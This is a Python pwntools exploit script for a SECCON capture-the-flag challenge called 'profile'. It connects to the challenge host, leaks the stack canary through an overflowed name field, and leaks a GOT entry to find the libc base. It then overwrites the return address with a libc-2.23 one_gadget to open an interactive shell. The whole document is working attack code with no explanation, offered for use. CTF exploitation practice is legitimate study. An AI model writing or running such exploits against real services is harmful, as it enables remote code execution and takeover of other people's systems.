from pwn import *

r = remote("profile.pwn.seccon.jp", 28553)
libc = ELF("./libc-2.23.so",checksec=False)
binary = ELF("./profile",checksec=False)

r.sendline("A"*8)
r.sendline("1"*1)
r.sendline("B"*3)
r.recv()

status_canary = False
canary_found  = False
print "=====SEARCHING FOR CANARY====="
for i in range(0,0x100,0xf):
    r.sendline("1")
    r.recv()
    if status_canary == True:
        r.sendline("B"*16 + chr(idx_canary))
    else:
        r.sendline("B"*16 + chr(i))
    r.recv()
    r.recv()
    r.sendline("2")
    r.recv()
    canary = r.recv().split("\n")[0].replace("Name : ","")
    if status_canary:
        break
    print "NOT FOUND"
    if canary.count("B") > 0 and canary.find("\x00") == -1 and canary[0] == "B":
        print "FOUND CANARY"
        idx_canary = i + 0x30 - (8-canary.count("B"))
        status_canary = True

if len(canary) != 8:
    print "leak canary fail!"
    exit(1)
canary = u64(canary)
print "CANARY : {}".format(hex(canary))
r.sendline("1")
r.recv()
r.sendline("B"*16 + p64(binary.got["malloc_usable_size"]))
r.recv()
r.recv()
r.sendline("2")
r.recv()
libc_setbuf = u64(r.recv().split("\n")[0].replace("Name : ",""))
print "LEAKED SETBUF GOT : {}".format(hex(libc_setbuf))

one_gadget = 0x45216
one_gadget = libc_setbuf - libc.symbols["malloc_usable_size"] + one_gadget
print "ONE_GADGET : {}".format(hex(one_gadget))

print "SPAWNING SHELL ..... !"
r.sendline("1")
r.recv()
r.sendline("\x00"*56 + p64(canary) + "\x00"*24 + p64(one_gadget))
r.recv()
r.recv()
r.sendline("0")
r.recv()

r.interactive()






